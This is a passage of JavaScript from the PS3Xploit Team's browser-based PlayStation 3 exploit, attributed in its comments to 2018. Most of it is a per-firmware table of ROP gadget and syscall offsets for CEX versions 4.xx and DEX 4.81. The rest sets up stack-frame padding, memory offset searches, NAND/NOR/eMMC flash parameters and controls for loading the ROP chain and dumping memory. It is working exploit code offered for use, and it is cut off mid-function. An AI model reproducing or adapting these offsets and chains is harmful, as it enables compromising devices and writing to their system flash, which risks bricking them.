                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x422D10;
                g_set_r3_with_ld=0x1969C8;
                g_sc_80=0x0D8668;
                g_sc_90=0x421B50;
                g_sc_A0=0x169E74;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x31385C;
                e_fopen_write_close=0x418F58;
                s_mount_hdd1=0x6220C0;
                g_init_reboot=0x0C4830;
                g_init_shutdown=0x0C47F8;
                g_exit_chain=0x2ACB18;
                //showOffsets();
                break;
                    
                // 4.20 CEX
                case fwCompat[3]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5120;
                g_1=0x0D8FB8;
                g_2=0x0970DC;
                g_set_r4_thru_r11=0x608764;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x4294C4;
                g_set_r3_with_ld=0x19B4C4;
                g_sc_80=0x0D8FB8;
                g_sc_90=0x428304;
                g_sc_A0=0x16E6D8;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x319D48;
                e_fopen_write_close=0x41F70C;
                s_mount_hdd1=0x62B248;
                g_init_reboot=0x0C4D34;
                g_init_shutdown=0x0C4CFC;
                g_exit_chain=0x2B2F8C;
                //showOffsets();
                break;
                    
                // 4.21 CEX
                case fwCompat[4]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5120;
                g_1=0x0D8F68;
                g_2=0x0970DC;
                g_set_r4_thru_r11=0x608498;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x4291F4;
                g_set_r3_with_ld=0x19B4C4;
                g_sc_80=0x0D8F68;
                g_sc_90=0x428034;
                g_sc_A0=0x16E6D8;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x319D4C;
                e_fopen_write_close=0x41F43C;
                s_mount_hdd1=0x62AF7C;
                g_init_reboot=0x0C4D34;
                g_init_shutdown=0x0C4CFC;
                g_exit_chain=0x2B2F90;
                //showOffsets();
                break;
                    
                // 4.25 CEX
                case fwCompat[5]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5128;
                g_1=0x0D8FC0;
                g_2=0x0970DC;
                g_set_r4_thru_r11=0x60850C;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x42925C;
                g_set_r3_with_ld=0x19B4B4;
                g_sc_80=0x0D8FC0;
                g_sc_90=0x42809C;
                g_sc_A0=0x16E6C8;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x319DB4;
                e_fopen_write_close=0x41F4A4;
                s_mount_hdd1=0x62AFF0;
                g_init_reboot=0x0C4D34;
                g_init_shutdown=0x0C4CFC;
                g_exit_chain=0x2B2FF8;
                //showOffsets();
                break;
                    
                // 4.30 CEX
                case fwCompat[6]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5220;
                g_1=0x0D95A0;
                g_2=0x09728C;
                g_set_r4_thru_r11=0x609F54;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x42A830;
                g_set_r3_with_ld=0x19BF94;
                g_sc_80=0x0D95A0;
                g_sc_90=0x429670;
                g_sc_A0=0x16F1A8;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x31AFF0;
                e_fopen_write_close=0x420A78;
                s_mount_hdd1=0x62CA38;
                g_init_reboot=0x0C4EE4;
                g_init_shutdown=0x0C4EAC;
                g_exit_chain=0x2B3AA4;
                //showOffsets();
                break;
                    
                // 4.31 CEX
                case fwCompat[7]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5220;
                g_1=0x0D95A0;
                g_2=0x09728C;
                g_set_r4_thru_r11=0x609F5C;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x42A834;
                g_set_r3_with_ld=0x19BF94;
                g_sc_80=0x0D95A0;
                g_sc_90=0x429674;
                g_sc_A0=0x16F1A8;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x31AFF4;
                e_fopen_write_close=0x420A7C;
                s_mount_hdd1=0x62CA40;
                g_init_reboot=0x0C4EE4;
                g_init_shutdown=0x0C4EAC;
                g_exit_chain=0x2B3AA8;
                //showOffsets();
                break;
                    
                // 4.40 CEX
                case fwCompat[8]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5368;
                g_1=0x0D95A8;
                g_2=0x09728C;
                g_set_r4_thru_r11=0x60C31C;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x42C8C0;
                g_set_r3_with_ld=0x19C09C;
                g_sc_80=0x0D95A8;
                g_sc_90=0x42B700;
                g_sc_A0=0x16F2A4;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x31CA94;
                e_fopen_write_close=0x422B08;
                s_mount_hdd1=0x62EE00;
                g_init_reboot=0x0C4EE4;
                g_init_shutdown=0x0C4EAC;
                g_exit_chain=0x2B4A40;
                //showOffsets();
                break;
                    
                // 4.41 CEX
                case fwCompat[9]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5368;
                g_1=0x0D95A8;
                g_2=0x09728C;
                g_set_r4_thru_r11=0x60C324;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x42C8C4;
                g_set_r3_with_ld=0x19C09C;
                g_sc_80=0x0D95A8;
                g_sc_90=0x42B704;
                g_sc_A0=0x16F2A4;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x31CA98;
                e_fopen_write_close=0x422B0C;
                s_mount_hdd1=0x62EE08;
                g_init_reboot=0x0C4EE4;
                g_init_shutdown=0x0C4EAC;
                g_exit_chain=0x2B4A44;
                //showOffsets();
                break;
                    
                // 4.45 CEX
                case fwCompat[10]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5630;
                g_1=0x0D95A8;
                g_2=0x09728C;
                g_set_r4_thru_r11=0x60CF3C;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x42D4CC;
                g_set_r3_with_ld=0x19C09C;
                g_sc_80=0x0D95A8;
                g_sc_90=0x42C30C;
                g_sc_A0=0x16F2A4;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x31D51C;
                e_fopen_write_close=0x423714;
                s_mount_hdd1=0x62FA20;
                g_init_reboot=0x0C4EE4;
                g_init_shutdown=0x0C4EAC;
                g_exit_chain=0x2B5720;
                //showOffsets();
                break;
                    
                // 4.46 CEX
                case fwCompat[11]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5630;
                g_1=0x0D95A8;
                g_2=0x09728C;
                g_set_r4_thru_r11=0x60CF3C;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x42D4CC;
                g_set_r3_with_ld=0x19C09C;
                g_sc_80=0x0D95A8;
                g_sc_90=0x42C30C;
                g_sc_A0=0x16F2A4;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x31D51C;
                e_fopen_write_close=0x423714;
                s_mount_hdd1=0x62FA20;
                g_init_reboot=0x0C4EE4;
                g_init_shutdown=0x0C4EAC;
                g_exit_chain=0x2B5720;
                //showOffsets();
                break;
                    
                // 4.50 CEX
                case fwCompat[12]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5CB0;
                g_1=0x0D9484;
                g_2=0x09732C;
                g_set_r4_thru_r11=0x60C380;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x42C6D8;
                g_set_r3_with_ld=0x19C2D0;
                g_sc_80=0x0D9484;
                g_sc_90=0x42B514;
                g_sc_A0=0x16F4AC;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x31E94C;
                e_fopen_write_close=0x42291C;
                s_mount_hdd1=0x62EF44;
                g_init_reboot=0x0C4F84;
                g_init_shutdown=0x0C4F4C;
                g_exit_chain=0x2B6E84;
                //showOffsets();
                break;
                    
                // 4.53 CEX
                case fwCompat[13]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5CC8;
                g_1=0x0D94A0;
                g_2=0x09732C;
                g_set_r4_thru_r11=0x60C768;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x42CA5C;
                g_set_r3_with_ld=0x19C300;
                g_sc_80=0x0D94A0;
                g_sc_90=0x42B898;
                g_sc_A0=0x16F4DC;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x31EC40;
                e_fopen_write_close=0x422CA0;
                s_mount_hdd1=0x62F32C;
                g_init_reboot=0x0C4F84;
                g_init_shutdown=0x0C4F4C;
                g_exit_chain=0x2B7160;
                //showOffsets();
                break;
                    
                // 4.55 CEX
                case fwCompat[14]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5CC8;
                g_1=0x0D9450;
                g_2=0x09732C;
                g_set_r4_thru_r11=0x60D554;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x42D848;
                g_set_r3_with_ld=0x19C300;
                g_sc_80=0x0D9450;
                g_sc_90=0x42C684;
                g_sc_A0=0x16F4DC;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x31FA2C;
                e_fopen_write_close=0x423A8C;
                s_mount_hdd1=0x630118;
                g_init_reboot=0x0C4F84;
                g_init_shutdown=0x0C4F4C;
                g_exit_chain=0x2B7F4C;
                //showOffsets();
                break;
                    
                // 4.60 CEX
                case fwCompat[15]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5DA8;
                g_1=0x0D9468;
                g_2=0x0972E4;
                g_set_r4_thru_r11=0x611094;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x42F52C;
                g_set_r3_with_ld=0x19D0BC;
                g_sc_80=0x0D9468;
                g_sc_90=0x42E368;
                g_sc_A0=0x170294;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x3216BC;
                e_fopen_write_close=0x425708;
                s_mount_hdd1=0x633C58;
                g_init_reboot=0x0C4F4C;
                g_init_shutdown=0x0C4F14;
                g_exit_chain=0x2B9680;
                //showOffsets();
                break;
                    
                // 4.65 CEX
                case fwCompat[16]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5DB0;
                g_1=0x0D9468;
                g_2=0x0972E4;
                g_set_r4_thru_r11=0x6110F4;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x42F588;
                g_set_r3_with_ld=0x19D114;
                g_sc_80=0x0D9468;
                g_sc_90=0x42E3C4;
                g_sc_A0=0x1702EC;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x321718;
                e_fopen_write_close=0x425764;
                s_mount_hdd1=0x633CB8;
                g_init_reboot=0x0C4F4C;
                g_init_shutdown=0x0C4F14;
                g_exit_chain=0x2B96DC;
                //showOffsets();
                break;
                    
                // 4.66 CEX
                case fwCompat[17]:
                vshType="CEX";
                addr_idps=0x715BB8;
                g_toc=0x6F5DC0;
                g_1=0x0D9468;
                g_2=0x0972E4;
                g_set_r4_thru_r11=0x611414;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x42F588;
                g_set_r3_with_ld=0x19D114;
                g_sc_80=0x0D9468;
                g_sc_90=0x42E3C4;
                g_sc_A0=0x1702EC;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x321718;
                e_fopen_write_close=0x425764;
                s_mount_hdd1=0x633FD8;
                g_init_reboot=0x0C4F4C;
                g_init_shutdown=0x0C4F14;
                g_exit_chain=0x2B96DC;
                //showOffsets();
                break;
                    
                // 4.70 CEX
                case fwCompat[18]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5E30;
                g_1=0x0D9364;
                g_2=0x0972E4;
                g_set_r4_thru_r11=0x611F84;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x42FD90;
                g_set_r3_with_ld=0x19D07C;
                g_sc_80=0x0D9364;
                g_sc_90=0x42EBCC;
                g_sc_A0=0x1702A4;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x321EE0;
                e_fopen_write_close=0x425F6C;
                s_mount_hdd1=0x634B48;
                g_init_reboot=0x0C4F4C;
                g_init_shutdown=0x0C4F14;
                g_exit_chain=0x2B9EB4;
                //showOffsets();
                break;
                    
                // 4.75 CEX
                case fwCompat[19]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F57E8;
                g_1=0x0D9364;
                g_2=0x0972E4;
                g_set_r4_thru_r11=0x6107E4;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x43034C;
                g_set_r3_with_ld=0x19D078;
                g_sc_80=0x0D9364;
                g_sc_90=0x42F188;
                g_sc_A0=0x1702A0;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x32249C;
                e_fopen_write_close=0x426528;
                s_mount_hdd1=0x6333A8;
                g_init_reboot=0x0C4F4C;
                g_init_shutdown=0x0C4F14;
                g_exit_chain=0x2BA470;
                //showOffsets();
                break;
                    
                // 4.76 CEX
                case fwCompat[20]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F57E8;
                g_1=0x0D9364;
                g_2=0x0972E4;
                g_set_r4_thru_r11=0x6107E4;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x43034C;
                g_set_r3_with_ld=0x19D078;
                g_sc_80=0x0D9364;
                g_sc_90=0x42F188;
                g_sc_A0=0x1702A0;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x32249C;
                e_fopen_write_close=0x426528;
                s_mount_hdd1=0x6333A8;
                g_init_reboot=0x0C4F4C;
                g_init_shutdown=0x0C4F14;
                g_exit_chain=0x2BA470;
                //showOffsets();
                break;
                    
                // 4.78 CEX
                case fwCompat[21]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5780;
                g_1=0x0D9364;
                g_2=0x0972E4;
                g_set_r4_thru_r11=0x60DAE0;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x42D5BC;
                g_set_r3_with_ld=0x19D078;
                g_sc_80=0x0D9364;
                g_sc_90=0x42C3F8;
                g_sc_A0=0x1702A0;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x31F70C;
                e_fopen_write_close=0x423798;
                s_mount_hdd1=0x6306A4;
                g_init_reboot=0x0C4F4C;
                g_init_shutdown=0x0C4F14;
                g_exit_chain=0x2BA968;
                //showOffsets();
                break;
                    
                // 4.80 CEX
                case fwCompat[22]:
                vshType="CEX";
                addr_idps=0x000000;
                g_toc=0x6F5520;
                g_1=0x0D9684;
                g_2=0x097604;
                g_set_r4_thru_r11=0x60E588;
                g_set_high_only=g_set_r4_thru_r11+0x7C;
                g_set_r3_from_r29=0x42D944;
                g_set_r3_with_ld=0x19D3B0;
                g_sc_80=0x0D9684;
                g_sc_90=0x42C780;
                g_sc_A0=0x1705D8;
                g_sc_set_r3_from_r9=g_1-0x4;
                g_sc_set_r3_from_r10=0x31FA94;
                e_fopen_write_close=0x423B20;
                s_mount_hdd1=0x63114C;
                g_init_reboot=0x0C526C;
                g_init_shutdown=0x0C5234;
                g_exit_chain=0x2BACB0;
                //showOffsets();
                break;
                
                // 4.81
                case fwCompat[23]:
                   //alert(compat_msg_success);
                    
                    if (confirm(msg_select_vsh_type)) {
                        
                        // CEX
                        vshType="CEX";
                        addr_idps=0x725608;
                        g_toc=0x6F5520;
                        g_1=0x0D9684;
                        g_2=0x097604;
                        g_set_r4_thru_r11=0x60E59C;
                        g_set_high_only=g_set_r4_thru_r11+0x7C;
                        g_set_r3_from_r29=0x42D938;
                        g_set_r3_with_ld=0x19D3B0;
                        g_set_r31_F8=0x626C30;
                        g_set_r31_108=0x627DF8;
                        g_sc_80=0x0D9684;
                        g_sc_90=0x42C774;
                        g_sc_A0=0x1705D8;
                        g_sc_set_r3_from_r9=g_1-0x4;
                        g_sc_set_r3_from_r10=0x31FA88;
                        e_fopen_write_close=0x423B14;
                        s_mount_hdd1=0x631160;
                        s_unk_game_debug_pafjob=0x0D103C;
                        g_mount_flash=0x602B88;
                        g_init_reboot=0x0C526C;
                        g_init_shutdown=0x0C5234;
                        g_exit_chain=0x2BACB4;
                        //showOffsets();
                    } else {
                        // DEX
                        vshType="DEX";
                        addr_idps=0x735F98;
                        g_toc=0x705610;
                        g_1=0x0DEBD8;
                        g_2=0x0976BC;
                        g_set_r4_thru_r11=0x6161B8;
                        g_set_high_only=g_set_r4_thru_r11+0x7C;
                        g_set_r3_from_r29=0x43552C;
                        g_set_r3_with_ld=0x1A43FC;
                        g_set_r3_with_lwz_from_r31=0x37F0CC;
                        g_set_r5_from_r29=0x4C7EF0;
                        //g_set_r31_E8=0x62ABD8;
                        g_set_r31_F8=0x62E84C;
                        g_set_r31_108=0x62FA14;
                        //g_set_r3_with_ld=0x7A00CC;
                        //g_set_r3_and_clear=0x09F604;
                        //g_set_r3_and_sc=0x208500;
                        //g_set_r20_thru_r31=0x208538;
                        //g_set_r31_from_r23=0x5D7940;
                        //g_store_r3_into_r31=0x616204;
                        g_sc_80=0x0DEBD8;
                        g_sc_90=0x434368;
                        g_sc_A0=0x177684;
                        g_sc_set_r3_from_r9=g_1-0x4;
                        g_sc_set_r3_from_r10=0x327298;
                        g_sc_set_r3_with_lwz_from_r31=0x1BAC30;// alternate 0x3A4C28 
                        
                        // Exits
                        g_init_reboot=0x0C6768;
                        g_init_shutdown=0x0C6730;
                        //g_exit_chain=0x30FD38;
                        g_exit_chain=0x2C24DC;
                        
                        // Subs
                        s_cellfs_write=0x524984;
                        s_create_new_user=0x0D27E8;
                        s_mount_hdd1=0x638D7C;
                        s_ps_button_bp=0x12FB14;
                        s_remove_act_dat=0x259120;
                        s_remove_exdata=0x25A638;
                        s_start_busy_icon=0x0DD944;
                        s_unk_create_new_user2=0x0DA588;
                        s_unk_create_new_user3=0x0D28D4;
                        s_unk_flash2_post_update=0x0DFDD4;
                        s_unk_game_exec=0x1316E4;
                        s_unk_game_debug_pafjob=0x0D64DC;
                        s_unk_manager_signout=0x0FC354;
                        s_unk_mount_hdd=0x0DF64C;
                        s_unk_network_printf=0x0CB6CC;
                        //s_unk_npmt=0x0FDFA8;
                        //s_unk_npmt2=0x0FDF7C;
                        s_unk_premo_plugin=0x0D2160;
                        s_unk_psx_ps2=0x544788;
                        s_unk_upload_util=0x16EB30;
                        
                        // Exports
                        e_cellfs_closedir=0x62C22C;
                        e_cellfs_opendir=0x62C0FC;
                        e_cellfs_readdir=0x62C1D4;
                        e_fopen_write_close=0x42B708;
                        e_stdc_opendir=0x0ADEDC;
                        e_stdc_readdir=0x0ADC58;
                        e_unk_boot2=0x516FF4;
                        e_unk_game_plugin=0x357BB0;
                        e_unk_vsh_printf=0x0CB72C;// 0x0A14B8 [file name in r3??, message in r4??]
                        e_unk_xmb_plugin=0x0DE748;
                        e_turnoff=0x0CD764;// 0x0D673C
                        //e_turnoff2=0x0CD62C;
                        
                        // Unsorted/New
                        //g_fsopen_write_close=0x280450;
                        //g_fsopen_write_close=0x25E850;
                        //g_fsopen_write_close=0x0E11EC;
                        //g_cellfs_open_write_close1=0x27F8A4;
                        //g_unk_user_id1=0x0FB340;
                        //g_unk_user_id2=0x1981D4;
                        //g_unk_registry1=0x536D70;
                        //g_unk_registry_backup=0x5379CC;
                        //g_unk_registry_restore=0x537AE0;
                        //g_unk_explore_plugin_bin=0x15E524;
                        //g_unk_psp_rif=0x256BE0;
                        //g_unk_login_xmb=0x0DD7C0;
                        //g_xmb_restore=0x0DE27C;
                        //g_unk_pkg1=0x327F1C;
                        //g_unk_sync=0x3296A8;
                        //g_unk_bg_download1=0x32A6F4;
                        //g_unk_bg_download2=0x32A77C;
                        //g_unk_post_update1=0x0CFDE4;
                        //g_unk_post_update2=0x0D8BB8;
                        //g_unk_crash_report1=0x0DFA24;
                        //g_unk_http_client=0x1BC6E4;
                        //g_unk_fsck=0x0DF2C0;
                        //g_unk_debug1=0x0CA978;
                        //g_tty_write=0x0AD31C;
                        //g_unk_alpha_numeric=0x544F64;
                        //g_unk_act_dat1=0x258D58;
                        //g_unk_act_dat2=0x25938C;
                        //g_unk_rif1=0x25A728;
                        //g_unk_rif2=0x25A820;
                        //g_unk_rif3=0x25AB60;
                        //g_unk_exdata_edat1=0x25ACBC;
                        //g_unk_thread1=0x11B8AC;
                        //g_unk_prx1=0x61EA18;
                        //g_unk_mount_bdvd=0x544998;
                        //g_unk_mount_fat=0x544BD4;
                        //g_unk_display_res1=0x0C88F8;
                        //g_unk_display_res2=0x1508A8;
                        //g_unk_game_res=0x0CA1BC;
                        //g_unk_update_game_data=0x1300B4;
                        
                        //showOffsets();
                    }
                    
                    break;
                    
                // 4.82 CEX
                case fwCompat[24]:
                    vshType="CEX";
                    addr_idps=0x725A38;
                    g_toc=0x6F5550;
                    g_1=0x0D9684;
                    g_2=0x097604;
                    g_set_r4_thru_r11=0x60EF38;
                    g_set_high_only=g_set_r4_thru_r11+0x7C;
                    g_set_r3_from_r29=0x42D93C;
                    g_set_r3_with_ld=0x19D3B0;
                    g_set_r31_F8=0x6275CC;
                    g_set_r31_108=0x628794;
                    g_sc_80=0x0D9684;
                    g_sc_90=0x42C778;
                    g_sc_A0=0x1705D8;
                    g_sc_set_r3_from_r9=g_1-0x4;
                    g_sc_set_r3_from_r10=0x31FA8C;
                    e_fopen_write_close=0x423B18;
                    s_mount_hdd1=0x631AFC;
                    s_unk_game_debug_pafjob=0x0D103C;
                    g_init_reboot=0x0C526C;
                    g_init_shutdown=0x0C5234;
                    g_exit_chain=0x2BACB8;
                    //showOffsets();
                    break;
                    
                default:
                alert(compat_msg_wrong_fw);
                disableFeatures = true;
                document.getElementById("load_rop").disabled=true;
                break;
            }
        }
        else
        {
            disableFeatures = true;
            toggleDisableButtons(true);
            document.getElementById("load_rop").disabled=true;
            //break;
        }
        
    }
}

function showOffsets()
{
    alert("Loaded Offsets (1 of 2)\n\n" + "g_toc: 0x" + g_toc.toString(16).toUpperCase() + "\ng_1: 0x" + g_1.toString(16).toUpperCase() + "\ng_2: 0x" + g_2.toString(16).toUpperCase() + "\ng_set_r4_thru_r11: 0x" + g_set_r4_thru_r11.toString(16).toUpperCase() + "\ng_set_r3_from_r29: 0x" + g_set_r3_from_r29.toString(16).toUpperCase());
    alert("Loaded Offsets (2 of 2)\n\n" + "g_sc_80: 0x" + g_sc_80.toString(16).toUpperCase() + "\ng_sc_90: 0x" + g_sc_90.toString(16).toUpperCase() + "\ng_sc_A0: 0x" + g_sc_A0.toString(16).toUpperCase() + "\ng_init_shutdown: 0x" + g_init_shutdown.toString(16).toUpperCase());
}
// PS3 Stack Frame Padding
// PS3Xploit Team 2018 / ps3xploit.com


// Padding Options
var pad1=0x00;// 1 byte
var pad2=0x0000;// 2 bytes
var pad3=0x000000;// 3 bytes
var pad4=0x00000000;// 4 bytes
var pad5=0x0000000000;// 5 bytes
var pad6=0x000000000000;// 6 bytes
var pad7=0x00000000000000;// 7 bytes
var pad8=0x0000000000000000;// 8 bytes

// Used for extsw instructions to force fisrt 8 bytes to be 00000000
var pad1ext=0xF0;// 1 byte
var pad2ext=0xF000;// 2 bytes
var pad3ext=0xF00000;// 3 bytes
var pad4ext=0xF0000000;// 4 bytes
var pad5ext=0xF000000000;// 5 bytes
var pad6ext=0xF00000000000;// 6 bytes
var pad7ext=0xF0000000000000;// 7 bytes
var pad8ext=0xF000000000000000;// 8 bytes

// PS3 Default Variables
// PS3Xploit Team 2018 / ps3xploit.com


function setDefaults()
{
    // Check User Agent For Info
    ps3chk();
    
    // Enable Stuff
    toggleDisableButtons(false);
    
    showGuiText();// display all text on GUI
    
    hideElement("debug-alert", true);
    disableElement("debug-alert", false);
    
    // Disable Stuff
    disableElement("load_rop", true);
    disableElement("marked_chmod", true);
    disableElement("marked_chown", true);
    
    disableElement("marked_memdump_addr", true);
    disableElement("marked_memdump_size", true);
    disableElement("marked_memdump_addr_edit", true);
    disableElement("marked_memdump_size_edit", true);
    disableElement("memdump_save_new_values", true);
    
    // Reset Paths
    setValueToHTML("path_src","");
    setValueToHTML("path_src_type","");
    setValueToHTML("path_dest","");
    setValueToHTML("path_dest_type","");
    
    setValueToHTML("file_size_edit","");// default file size
    
    if(debug_mode){writeEnvInfo(document.getElementById('footer'));}
    
    //default_settings.focus();
    document.getElementById("default_settings").focus();

}

function initRopDefaults()
{
    // Store Selected Flash Type Backup For Searching
    ftype=type;
    
    str2u_adjusted=false;// reset str2u adjust
    
    // Reset Flag
    allOffsetsFound=false;
    
    // Set some values from web page
    setPathNames();
    
    // Check For Default Page Settings
    if(default_settings){setArgsFromPage();}
    
    // Check For Input Values
    if(chain_stackframe===""){alert(msg_no_chain_selected);marked_hex.focus();return;}
    
    toggleDisableButtons(true);
    hideElement("debug-alert", true);// hide debug output button by default
    
    // Check Flash Type
    switch(type)
    {
        case 0:
        flash_type=nand_flag;
        st_sec=0x204;
        break;
        case 1:
        flash_type=nor_flag;
        st_sec=0x178;
        break;
        case 2:
        flash_type=emmc_flag;
        st_sec=0x204;
        break;
    }
    
    // Log Entry
    if(debug_mode){log_div = logEntry();}
    
    // Reset Timeout Value
    t_out=0;
    
    total_loops++;
}

function toggleAutoReload()
{
    if(auto_reload)
    {
        auto_reload=false;
    }
    else{
        auto_reload=true;
    }
}

function toggleTrigger()
{
    if(disable_trigger)
    {
        disable_trigger=false;
    }
    else{
        disable_trigger=true;
    }
}

function reloadPage(){window.location.reload();}

function logForGC()
{
    console.log(s2hex(base_fp), log_div);
    console.log(s2hex(stack_frame), log_div);
    console.log(s2hex(jump_2), log_div);
    console.log(s2hex(jump_1), log_div);
    
    if(debug_mode){writeEnvInfo(document.getElementById('footer'));}
}

function getDate()
{
    //return y+"/"+m+"/"+d+"/";
    return str2u(y+"/"+m+"/"+d+"/");
}

function setInnerHTML(elem,str)
{
    if(elem)elem.innerHTML=str;
}

function addInnerHTML(elem,str)
{
    if(elem)elem.innerHTML+=str;
}

function setVisible(elem)
{
    if(elem)elem.style.visibility='visible';
}

function setInvisible(elem)
{
    if(elem)elem.style.visibility='hidden';
}

function enable_element(elem)
{
    if(elem)elem.disabled=false;
}

function disable_element(elem)
{
    if(elem)elem.disabled=true;
}

function cbcheck(elem)
{
    if(elem)elem.checked=true;
}

function cbuncheck(elem)
{
    if(elem)elem.checked=false;
}

function chainSucceed(msg)
{
    document.getElementById('result').innerHTML=msg;
    if(debug_mode){logAdd(msg, log_div);}
}

function logFoundOffsets()
{
    logAdd("search_max_threshold: "+search_max_threshold+"\nsearch_max_threshold_backup: "+search_max_threshold_backup+"\nsearch_base_offset: "+search_base_offset+"\nsearch_base_offset_min: "+search_base_offset_min+"\nsearch_base_offset_max: "+search_base_offset_max+"\nsearch_base_offset_adjust: "+search_base_offset_adjust+"\nsearch_base_offset_adjust_jump2: "+search_base_offset_adjust_jump2+"\nsearch_base_offset_adjust_jump1: "+search_range_size+"\nsearch_max_threshold: "+search_range_size);
}

function logFlashType()
{
    logAdd(msg_search_flash_type_start+flash_type_text+msg_search_flash_type_end);
}

// Search Related
function setDefaultSearchParams()
{
    switch(flash_type_select)
    {
        // NAND
        case 0:
        search_max_threshold = 70*0x100000;
        search_max_threshold_backup = 70*0x100000;
        search_base_offset = 0x80200000;// 0x80190000
        search_base_offset_min = 0x80200000;
        search_base_offset_max = search_base_offset_min+0x240000;
        search_base_offset_adjust=0x100000;
        search_base_offset_adjust_jump2=0x100000;
        search_base_offset_adjust_jump1=0x100000;
        search_range_size = 0x200000;
        if(debug_mode){logFoundOffsets();}
        if(debug_mode){logFlashType();}
        break;
        
        // NOR
        case 1:
        search_max_threshold = 70*0x100000;
        search_max_threshold_backup = 70*0x100000;
        search_base_offset = 0x80200000;// 0x80190000
        search_base_offset_min = 0x80200000;
        search_base_offset_max = search_base_offset_min+0x240000;
        search_base_offset_adjust=0x100000;
        search_base_offset_adjust_jump2=0x100000;
        search_base_offset_adjust_jump1=0x100000;
        search_range_size = 0x200000;
        if(debug_mode){logFoundOffsets();}
        if(debug_mode){logFlashType();}
        break;
        
        // eMMC
        case 2:
        search_max_threshold = 70*0x100000;
        search_max_threshold_backup = 70*0x100000;
        search_base_offset = 0x80200000;// 0x80190000
        search_base_offset_min = 0x80200000;
        search_base_offset_max = search_base_offset_min+0x240000;
        search_base_offset_adjust=0x100000;
        search_base_offset_adjust_jump2=0x100000;
        search_base_offset_adjust_jump1=0x100000;
        search_range_size = 0x200000;
        if(debug_mode){logFoundOffsets();}
        if(debug_mode){logFlashType();}
        break;
        
        default:
        break;
    }
    
}

function searchSucceed()
{
    document.getElementById('result').innerHTML=msg_success_init;
    if(debug_mode){logAdd(trigger_msg, log_div);}
}

function searchFail()
{
    total_loops=0;
    searchResetTimeout();
    
    if(allOffsetsFound)
    {
        result_msg=msg_string_verify_fail;
    }
    else
    {
        result_msg=msg_string_search_fail;
    }
    
    //showFoundOffsets(offset_find_jump1);
    document.getElementById('result').innerHTML=result_msg;
    document.getElementById("reload_page").disabled=false;
    reload_page.focus();
}

function reloadInitROP()
{
    resetSearchOffsetMsg();
